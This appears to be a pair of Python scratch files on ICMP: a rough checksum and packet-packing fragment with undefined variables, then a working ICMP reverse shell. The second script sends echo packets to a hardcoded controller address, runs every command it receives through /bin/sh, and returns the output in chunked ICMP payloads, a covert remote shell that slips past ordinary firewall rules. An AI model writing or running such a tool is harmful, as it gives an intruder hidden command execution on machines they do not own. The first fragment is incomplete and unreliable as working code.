from socket import AF_INET, SOCK_RAW, IPPROTO_ICMP

# socket.sendto(packet.packet, (dstaddr, 1))
# receiving: IcmpPacket(raw_p = self.socket.recv(1024)[20:0]) why 20??

from struct import pack, unpack

def checksum(source_string):
    # I'm not too confident that this is right but testing seems to
    # suggest that it gives the same answers as in_cksum in ping.c.
    sum = 0
    count_to = (len(source_string) / 2) * 2
    count = 0
    while count < count_to:
        this_val = ord(source_string[count + 1])*256+ord(source_string[count])
        sum += this_val
        sum = sum & 0xffffffff # Necessary?
        count = count + 2
    if count_to < len(source_string):
        sum = sum + ord(source_string[len(source_string) - 1])
        sum = sum & 0xffffffff # Necessary?
    sum = (sum >> 16) + (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    # Swap bytes. Bugger me if I know why.
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

#self.packet = struct.pack(packet_fmt, self.type_packet, self.code,
#                                      self.checksum, self.identifier,
#                                      self.seq_n, str(self.payload))
#self.calcule_checksum()
#self.packet = struct.pack(packet_fmt, self.type_packet, self.code,
#                                      self.checksum, self.identifier,
#                                      self.seq_n, str(self.payload))
packet = pack(packetFormat,
              typePacket,
              code,
              checksum,
              identifier,
              seq_n,
              str(payload))

============================================================================================

from socket import socket, AF_INET, SOCK_RAW, IPPROTO_ICMP, IPPROTO_IP, IP_HDRINCL
from impacket import ImpactDecoder, ImpactPacket
from subprocess import Popen, PIPE
# Spawning shell instead of "response=#"?
from pty import spawn
from select import select

dst = '172.16.3.104'

s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
s.setblocking(0)
s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)

ip = ImpactPacket.IP()
ip.set_ip_dst(dst)

icmp = ImpactPacket.ICMP()
icmp.set_icmp_type(icmp.ICMP_ECHO)
response = "8==> "
#print('[+] Response: {}'.format(response))
icmp.contains(ImpactPacket.Data(response))
icmp.set_icmp_cksum(0)
icmp.auto_checksum = 1
ip.contains(icmp)
s.sendto(ip.get_packet(), (dst, 0))
decoder = ImpactDecoder.IPDecoder()

while True:
    if s in select([s], [], [], 15)[0]:
        stuff = s.recv(4096)
        if len(stuff) == 0:
            s.close()
            exit()

        ippacket = decoder.decode(stuff)
        icmppacket = ippacket.child()
        # If the packet matches, report it to the user
        # Get identifier and sequence number
        data = icmppacket.get_data_as_string()
        if len(data) > 0:
            if data != '\n':
                print('[+] Data: {}'.format(str(data)))

                if data.split('\n')[0] == 'exit':
                    s.close()
                    break

                # Parse command from standard input
                try:
                    shell_proc = Popen(["/bin/sh", "-i"],
                                           shell=True,
                                           stdin=PIPE,
                                           stdout=PIPE,
                                           stderr=PIPE)
                except Exception as e:
                    print('[!] Uh-oh! {}'.format(e))
                try:
                    response = shell_proc.communicate(data)[0]
                    print('[+] Response: {}'.format(response))

                except Exception as e:
                    print('[+] Uh-oh! {}'.format(e))
                    response = 'error\n'
                response = response + '#'
                print('[+] Response: {}'.format(response))
            else:
                response = '#'

        if len(response) > 1432:
            chunks, chunk_size = len(response), len(response) / 1432
            print('[+] Chunks: {}\tChunk size: {}'.format(chunks, chunk_size))
            for i in range(0, chunks, chunk_size):
                print('[+] Response {}: {}'.format(i, str(response[i:i + chunk_size])))
                icmp.contains(ImpactPacket.Data(str(response[i:i + chunk_size])))

                icmp.set_icmp_cksum(0)
                icmp.auto_checksum = 1

                ip.contains(icmp)

                s.sendto(ip.get_packet(), (dst, 0))
                print('[+] Packet sent: {}'.format(response))
        else:
            icmp.contains(ImpactPacket.Data(response))
            icmp.set_icmp_cksum(0)
            icmp.auto_checksum = 1
            ip.contains(icmp)
